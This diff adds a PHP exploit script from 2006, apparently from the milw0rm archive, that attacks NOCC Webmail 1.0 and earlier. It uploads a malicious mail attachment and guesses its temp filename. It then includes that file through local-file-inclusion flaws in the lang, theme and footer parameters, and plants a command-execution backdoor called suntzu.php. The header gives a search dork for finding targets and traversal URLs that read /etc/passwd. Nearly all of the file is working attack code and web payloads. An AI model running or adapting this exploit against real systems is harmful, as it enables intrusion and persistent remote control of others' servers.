@@ -1,0 +1,490 @@
+<?php
+#  ---noccw_10_incl_xpl.php                                 8.22 23/02/2006    #
+#                                                                              #
+#  NOCC Webmail <= 1.0 remote commands execution exploit through arbitrary     #
+#  local inclusion & attachment filename prediction                            #
+#                                                                              #
+#                              coded by rgod                                   #
+#                     site: http://retrogod.altervista.org                     #
+#                                                                              #
+# -> works regardless of any magic_quotes_gpc settings                         #
+#                                                                              #
+# dork: ("powered by nocc" intitle:"NOCC Webmail") -site:sourceforge.net       #
+# -Zoekinalles.nl -analysis                                                    #
+#                                                                              #
+# Sun-Tzu: "Knowing the place and the time of the coming  battle, we may       #
+# concentrate from the greatest distances in order to fight"                   #
+
+/* short explaination:
+   we have various arbitrary local inclusion issues, ex:
+
+   http://[tArGeT]/[pAtH]/index.php?lang=../../../../../../../../../../../../etc/passwd%00
+   http://[tArGeT]/[pAtH]/index.php?theme=../../../../../../../../../../../etc/passwd%00
+   http://[tArGeT]/[pAtH]/html/footer.php?_SESSION[nocc_theme]=../../../../../../../../etc/passwd%00
+
+   This code upload an evil mail attachment (file is renamed by NOCC...).
+   After, it tries to include it, predicting its name and its location, ex:
+
+   http://[tArGeT]/[pAtH]/index.php?lang=../tmp/php354.tmp1140521343.att%00&cmd=ls%20-la
+   http://[tArGeT]/[pAtH]/index.php?theme=../tmp/php354.tmp1140521343.att%00&cmd=ls%20-la
+   http://[tArGeT]/[pAtH]/html/footer.php?_SESSION[nocc_theme]=..%2f..%2Ftmp%2Fphp53.tmp1140662880.att%00
+
+   If succeeded, it installs  a backdoor called suntzu.php on target server.
+
+   To launch this exploit you need a POP3 account on a machine of your choice,
+   you need to supply servername, username & password.
+
+   a note:
+   you can do the same manually and more quickly with profile files, if
+   enabled, ex:
+   edit your profile, then:
+
+   http://[target]/[path]/index.php?cmd=cat%20conf.php&lang=../profiles/username@somehost.com.pref%00
+
+   see the full advisory here: http://retrogod.altervista.org/noccw_10_incl_xpl.html
+                                                                              */
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",10);
+ob_implicit_flush (1);
+
+echo'<html><head><title> **** NOCC Webmail <= 1.0 remote commands execution ****
+</title><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<style type="text/css"> body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:
+#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img
+{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
+!important} option {  background-color:   #303030   !important}         textarea
+{background-color: #303030 !important} input {color: #1CB081 !important}  option
+{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
+{background-color: #303030 !important} select {font-weight: normal;       color:
+#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
+background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
+0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
+!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
+!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
+!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
+normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
+{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;
+color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
+font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
+font-weight:bold; font-style: italic;}--></style></head><body><p class="Stile6">
+ **** NOCC Webmail <= 1.0 remote commands execution ****</p><p class="Stile6">a
+script  by  rgod  at    <a href="http://retrogod.altervista.org"target="_blank">
+http://retrogod.altervista.org</a> </p> <table  width="84%"><tr><td width="43%">
+<form name="form1" method="post" action="'.$_SERVER[PHP_SELF].'">    <p><input
+type="text"  name="hOsT"> <span class="Stile5">* tArGeT    (ex:www.sitename.com)
+</span></p> <p><input type="text" name="pAtH">  <span class="Stile5">* pAtH (ex:
+/nocc/ or just / )  </span> </p> <p> <input type="text"  name="cmd">       <span
+class="Stile5"> * specify a command   </span> </p>  <p>      <input  type="text"
+name="POP3_SERVER"><span class="Stile5"> * a POP3 server  </span> </p> <p><input
+type="text" name="USER"><span class="Stile5"> * USERNAME ...</span></p><p><input
+type="password"   name="PASSWD"> <span  class="Stile5"> * ... and PASSWORD to it
+</span></p><p><input type="text" name="PorT"><span class="Stile5">specify a PorT
+other than  80 (default value)</span> </p> <p> <input  type="text" name="pRoXy">
+<span class="Stile5"> send  exploit through an HTTP pRoXy (ip:PorT) </span> </p>
+<p><input type="submit" name="Submit" value="go!"></p></form></td></tr> </table>
+</body></html>';
+
+function show($headeri)
+{
+  $ii=0;$ji=0;$ki=0;$ci=0;
+  echo '<table border="0"><tr>';
+  while ($ii <= strlen($headeri)-1){
+    $dAtAi=dechex(ord($headeri[$ii]));
+    if ($ji==16) {
+      $ji=0;
+      $ci++;
+      echo "<td>&nbsp;&nbsp;</td>";
+      for ($li=0; $li<=15; $li++) {
+        echo "<td>".htmlentities($headeri[$li+$ki])."</td>";
+		}
+      $ki=$ki+16;
+      echo "</tr><tr>";
+    }
+    if (strlen($dAtAi)==1) {
+      echo "<td>0".htmlentities($dAtAi)."</td>";
+    }
+    else {
+      echo "<td>".htmlentities($dAtAi)."</td> ";
+    }
+    $ii++;$ji++;
+  }
+  for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++) {
+    echo "<td>&nbsp&nbsp</td>";
+  }
+  for ($li=$ci*16; $li<=strlen($headeri); $li++) {
+    echo "<td>".htmlentities($headeri[$li])."</td>";
+  }
+  echo "</tr></table>";
+}
+
+$pRoXy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpAcKeT() //2x speed
+{
+  global $pRoXy, $hOsT, $PorT, $pAcKeT, $HtMl, $pRoXy_regex;
+  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+  if ($socket < 0) {
+    echo "socket_create() failed: reason: " . socket_strerror($socket) . "<br>";
+  }
+  else {
+    $c = preg_match($pRoXy_regex,$pRoXy);
+    if (!$c) {echo 'Not a valid proxy...';
+    die;
+    }
+  echo "OK.<br>";
+  echo "Attempting to connect to ".$hOsT." on PorT ".$PorT."...<br>";
+  if ($pRoXy=='') {
+    $result = socket_connect($socket, $hOsT, $PorT);
+  }
+  else {
+    $parts =explode(':',$pRoXy);
+    echo 'Connecting to '.$parts[0].':'.$parts[1].' pRoXy...<br>';
+    $result = socket_connect($socket, $parts[0],$parts[1]);
+  }
+  if ($result < 0) {
+    echo "socket_connect() failed.\r\nReason: (".$result.") " . socket_strerror($result) . "<br><br>";
+  }
+  else {
+    echo "OK.<br><br>";
+    $HtMl= '';
+    socket_write($socket, $pAcKeT, strlen($pAcKeT));
+    echo "Reading response:<br>";
+    while ($out= socket_read($socket, 2048)) {$HtMl.=$out;}
+    echo nl2br(htmlentities($HtMl));
+    echo "Closing socket...";
+    socket_close($socket);
+  }
+  }
+}
+
+function sendpAcKeTii($pAcKeT)
+{
+  global $pRoXy, $hOsT, $PorT, $HtMl, $pRoXy_regex;
+  if ($pRoXy=='') {
+    $ock=fsockopen(gethOsTbyname($hOsT),$PorT);
+    if (!$ock) {
+      echo 'No response from '.htmlentities($hOsT); die;
+    }
+  }
+  else {
+	$c = preg_match($pRoXy_regex,$pRoXy);
+    if (!$c) {
+      echo 'Not a valid pRoXy...';die;
+    }
+    $parts=explode(':',$pRoXy);
+    echo 'Connecting to '.$parts[0].':'.$parts[1].' pRoXy...<br>';
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from pRoXy...';die;
+	}
+  }
+  fputs($ock,$pAcKeT);
+  if ($pRoXy=='') {
+    $HtMl='';
+    while (!feof($ock)) {
+      $HtMl.=fgets($ock);
+    }
+  }
+  else {
+    $HtMl='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$HtMl))) {
+      $HtMl.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  // echo nl2br(htmlentities($HtMl));
+}
+
+function greenwich_timestamp($HtMl)
+{
+   $temp=explode("Date: ",$HtMl);
+   $temp2=explode("\r\n",$temp[1]);
+   $is_now=$temp2[0];
+   $temp=explode(" ",$is_now);$day=$temp[1];$month=$temp[2];$year=$temp[3];$temp2=explode(":",$temp[4]);
+   $hour=$temp2[0];$min=$temp2[1];$sec=$temp2[2];
+   $tb=array ('Jan', '1','Feb', '2','Mar', '3','Apr', '4','May', '5','Jun', '6',
+   'Jul', '7','Aug', '8','Sep', '9','Oct', '10','Nov', '11','Dec', '12');
+   for ($i=0;$i<=23;$i++) {if ($month==$tb[$i]) {$month=$tb[$i+1];break;}}
+   return mktime($hour,$min,$sec,$month,$day,$year);
+}
+
+if ( get_magic_quotes_gpc() ) {
+   function stripslashes_deep($value) {
+       $value = is_array($value) ? array_map('stripslashes_deep', $value) : stripslashes($value);
+       return $value;
+   }
+   $_POST = stripslashes_deep($_POST);
+}
+
+$hOsT=$_POST[hOsT];$pAtH=$_POST[pAtH];$PorT=$_POST[PorT];
+$USER=$_POST[USER];$PASSWD=$_POST[PASSWD];$POP3_SERVER=$_POST[POP3_SERVER];
+$cmd=$_POST[cmd];
+echo "<span class=\"Stile5\">";
+if (($hOsT<>'') and ($pAtH<>'') and ($cmd<>''))
+{
+  $PorT=intval(trim($PorT));
+  if ($PorT=='') {$PorT=80;}
+  if (($pAtH[0]<>'/') or ($pAtH[strlen($pAtH)-1]<>'/')) {echo 'Error... check the pAtH!'; die;}
+  if ($pRoXy=='') {$p=$pAtH;} else {$p='http://'.$hOsT.':'.$PorT.$pAtH;}
+  $hOsT=str_replace("\r","",$hOsT);$hOsT=str_replace("\n","",$hOsT);
+  $pAtH=str_replace("\r","",$pAtH);$pAtH=str_replace("\n","",$pAtH);
+
+#STEP 0 -> Check if already succeeded on tArGeT hOsT...
+$subpAtH= array ('','html/');
+for ($i=0; $i<=count($subpAtH)-1; $i++)
+{
+  $pAcKeT ="GET ".$p.$subpAtH[$i]."suntzu.php?cmd=".urlencode($cmd)." HTTP/1.1\r\n";
+  $pAcKeT.="Host: ".$hOsT."\r\n";
+  $pAcKeT.="Connection: Close\r\n\r\n";
+  show($pAcKeT);
+  sendpAcKeTii($pAcKeT);
+  if (eregi("Hi Master!",$HtMl)) {echo nl2br(htmlentities($HtMl));
+                                  die("Exploit succeeded...");}
+}
+if (file_exists($hOsT.".txt"))
+  {
+   $f=fopen($hOsT.".txt","r");
+   $XpL=fgets($f);
+   fclose($f);
+   $pAcKeT ="GET ".$p.$XpL."&cmd=".urlencode($cmd)." HTTP/1.1\r\n";
+   $pAcKeT.="hOsT: ".$hOsT."\r\n";
+   $pAcKeT.="Connection: Close\r\n\r\n";
+   show($pAcKeT);
+   sendpAcKeTii($pAcKeT);
+   if (eregi("Hi Master!",$HtMl)) {echo nl2br(htmlentities($HtMl));
+                                   die("Exploit succeeded...");}
+}
+}
+
+if (($hOsT<>'') and ($pAtH<>'') and ($cmd<>'') and ($POP3_SERVER<>'') and ($USER<>'') and ($PASSWD<>''))
+{
+$difftime=0;
+//syncrhonize with remote tArGeT Unin epoch time by Apache "Date:" response header
+//it carries GMT time... sending two HEAD requests, one to target, one to yourself
+if (eregi("Date: ",$HtMl))
+{
+        $pAcKeT ="HEAD / HTTP/1.1\r\nhOsT: ".$hOsT."\r\nConnection: Close\r\n\r\n";
+        sendpAcKeTii($pAcKeT);
+        $itstime=greenwich_timestamp($HtMl);
+        echo "tArGeT hOsT greenwich timestamp: ".$itstime."<br>";
+        $pAcKeT=str_replace($hOsT,$_SERVER[SERVER_NAME],$pAcKeT);
+        $fp=fsockopen($_SERVER[SERVER_NAME],$_SERVER[SERVER_PORT]);
+        fputs($fp,$pAcKeT);$out='';
+        while (!feof($fp)){
+          $out.=fgets($fp);
+        }
+        fclose($fp);
+        $mytime=greenwich_timestamp($out);
+        echo "my greenwich timestamp: ".$mytime."<br>";
+        $difftime= $itstime-$mytime;
+        echo "difftime: ".$difftime."<br>";
+}
+  #STEP 1 -> Login to a POP3 server that you choose to have access on NOCC interface
+  $dAtA ="user=".$USER;
+  $dAtA.="&domainnum=0";
+  $dAtA.="&passwd=".$PASSWD;
+  $dAtA.="&server=".$POP3_SERVER;
+  $dAtA.="&port=110";
+  $dAtA.="&servtype=pop3";
+  $dAtA.="&lang=en";
+  $dAtA.="&theme=standard";
+  $dAtA.="&enter=Ok";
+  $pAcKeT ="POST ".$p."action.php HTTP/1.1\r\n";
+  $pAcKeT.="Referer: http://".$hOsT.$pAtH."\r\n";
+  $pAcKeT.="Accept-Language: en\r\n";
+  $pAcKeT.="Content-Type: application/x-www-form-urlencoded\r\n";
+  $pAcKeT.="User-Agent: Sun-Tzu\r\n";
+  $pAcKeT.="Host: ".$hOsT."\r\n";
+  $pAcKeT.="Content-Length: ".strlen($dAtA)."\r\n";
+  $pAcKeT.="Connection: Close\r\n";
+  $pAcKeT.="Cache-Control: no-cache\r\n\r\n";
+  $pAcKeT.=$dAtA;
+  show($pAcKeT);
+  sendpAcKeTii($pAcKeT);
+  $temp=explode("Set-Cookie: ",$HtMl);
+  $temp2=explode(" ",$temp[1]);
+  $COOKIE=$temp2[0];
+  $temp2=explode(" ",$temp[2]);
+  $COOKIE.=" ".$temp2[0];
+  echo "COOKIE -> ".htmlentities($COOKIE)."<BR>";
+
+#STEP 2 -> Upload the evil attachment...
+$action = array ('add', 'Attach'); //'action' name is different in some versions
+$found=0;
+for ($d=0; $d=count($action)-1; $d++)
+{
+$dAtA='-----------------------------7d630bc80618
+Content-Disposition: form-data; name="sort"
+
+1
+-----------------------------7d630bc80618
+Content-Disposition: form-data; name="sortdir"
+
+1
+-----------------------------7d630bc80618
+Content-Disposition: form-data; name="lang"
+
+en
+-----------------------------7d630bc80618
+Content-Disposition: form-data; name="action"
+
+write
+-----------------------------7d630bc80618
+Content-Disposition: form-data; name="sendaction"
+
+'.$action[$d].'
+-----------------------------7d630bc80618
+Content-Disposition: form-data; name="num_attach"
+
+0
+-----------------------------7d630bc80618
+Content-Disposition: form-data; name="mail_from"
+
+fake@fakemail.com
+-----------------------------7d630bc80618
+Content-Disposition: form-data; name="mail_to"
+
+
+-----------------------------7d630bc80618
+Content-Disposition: form-data; name="mail_cc"
+
+
+-----------------------------7d630bc80618
+Content-Disposition: form-data; name="mail_bcc"
+
+
+-----------------------------7d630bc80618
+Content-Disposition: form-data; name="mail_subject"
+
+
+-----------------------------7d630bc80618
+Content-Disposition: form-data; name="mail_att"; filename="C:\suntzuuuu.php"
+Content-Type: text/html
+
+<?php
+ob_clean();echo"Hi Master!";ini_set("max_execution_time",0);passthru($_GET[cmd]);
+$sun=fopen("suntzu.php","w");fputs($sun,"<?php ob_clean();echo\"Hi Master!\";ini_set(\"max_execution_time\",0);passthru(\$_GET[cmd]);");
+fclose($sun);chmod("suntzu.php",777);
+die;
+?>
+-----------------------------7d630bc80618
+Content-Disposition: form-data; name="priority"
+
+3 (Normal)
+-----------------------------7d630bc80618
+Content-Disposition: form-data; name="mail_body"
+
+
+-----------------------------7d630bc80618--';
+
+  $pAcKeT ="POST ".$p."send.php HTTP/1.1\r\n";
+  $pAcKeT.="Referer: http://".$hOsT.$pAtH."action.php?action=write&lang=en&sort=1&sortdir=1\r\n";
+  $pAcKeT.="Accept-Language: en\r\n";
+  $pAcKeT.="Content-Type: multipart/form-data; boundary=---------------------------7d630bc80618\r\n";
+  $pAcKeT.="User-Agent: Sun-Tzu\r\n";
+  $pAcKeT.="Host: ".$hOsT."\r\n";
+  $pAcKeT.="Content-Length: ".strlen($dAtA)."\r\n";
+  $pAcKeT.="Connection: Close\r\n";
+  $pAcKeT.="Cache-Control: no-cache\r\n";
+  $pAcKeT.="Cookie: ".$COOKIE."\r\n\r\n";
+  $pAcKeT.=$dAtA;
+  show($pAcKeT);
+  $mytime=time()+$difftime;
+
+  echo "predicting Unix epoch time on remote machine ->".$mytime."<br><br>";
+  sendpAcKeTii($pAcKeT);
+
+  if (eregi("suntzuuuu.php",$HtMl)) {$found=1; break;}
+}
+if ($found==0)
+{die("Failed to upload the attachment, maybe wrong pop3 details");}
+
+# STEP 3 Our routine... cycling to find the evil attachment and to launch commands...
+# ---------------------------------START----------------------------------------
+  //guessing where $tmpdir can be..., add some values here if you want
+  $tempdir= array (
+                  'tmp/',
+                  '../../../../../../../../../../../../../tmp/',
+		          '../../../../../../../../../../../../../temp/',
+                  '',
+		          'temp/',
+		          '../tmp/',
+		          '../../tmp/',
+		          '../../../tmp/',
+		          '../../../../tmp/',
+		          '../../../../../tmp/',
+		          '../../../../../../tmp/',
+		          '../../../../../../../tmp/'
+		          );
+  //predicting time() substring in attachment filename
+  $predict_time=
+            array (
+	          $mytime,
+	          $mytime + 1,
+	          $mytime + 2,
+	          $mytime + 3
+	          );
+
+function refresh()
+{
+  flush();
+  ob_flush();
+  usleep(10000);
+}
+$script= array (
+                "index.php?lang=",
+                "index.php?theme=",
+                "html/footer.php?_SESSION[nocc_theme]=..%2F"
+               );
+
+for ($y=1; $y<=65535; $y++) //some hex values in php temporary files
+{
+  $a_value=strtoupper(dechex($y));
+  for ($x=0; $x<=count($tempdir)-1; $x++) //for each possible file location
+  {
+    for ($z=0; $z<=count($predict_time) - 1; $z++) // for actual Unix epoch time, with +1,+2,+3
+    {
+      for($ww=0; $ww<=count($script)-1; $ww++) //for each vulnerable script
+      {
+      $XpL="../".$tempdir[$x]."php".$a_value.".tmp".$predict_time[$z].".att".chr(0x00);
+      $XpL=urlencode($XpL);
+      $XpL=$script[$ww].$XpL;
+      $pAcKeT ="GET ".$p.$XpL."&cmd=".urlencode($cmd)." HTTP/1.1\r\n";
+      $pAcKeT.="Host: ".$hOsT."\r\n";
+      $pAcKeT.="Connection: Close\r\n\r\n";
+      echo "trying with http://".$hOsT.$pAtH.$XpL."<br>"; refresh();
+      //show($pAcKeT);
+      sendpAcKeTii($pAcKeT);
+      if (eregi("Hi Master!",$HtMl))
+               { show($pAcKeT);
+                 echo nl2br(htmlentities($HtMl));
+		 $f=fopen($hOsT.".txt","w");
+		 fputs($f,$XpL);
+		 fclose($f);
+		 refresh();
+         die("Exploit succeded... We tried to put a backdoor on tArGeT system, ************ <br>
+		      call this url:                                                                <br>
+		      http://".htmlentities($hOsT.$pAtH)."suntzu.php?&cmd=[your command]            <br>
+		      or this:                                                                      <br>
+		      http://".htmlentities($hOsT.$pAtH)."html/suntzu.php?&cmd=[your command]       <br>
+		      however,if not succeeded, you can launch commands with this:                  <br>
+		      http://".htmlentities($hOsT.$pAtH.$XpL)."&cmd=[your command]                  <br>
+		      Also, we keep exploit url in ".htmlentities($hOsT).".txt, so you have not to  <br>
+		      cycle anymore...                                                              <br>
+		      Enjoy! ***********************************************************************<br>
+		     ");
+              }
+	  }
+    }
+  }
+}
+//If you are here...
+echo "Exploit failed...";
+#-------------------------------END---------------------------------------------
+}
+else
+{echo "Fill * required fields, optionally specify a pRoXy...";}
+?>
+
+# milw0rm.com [2006-02-23]
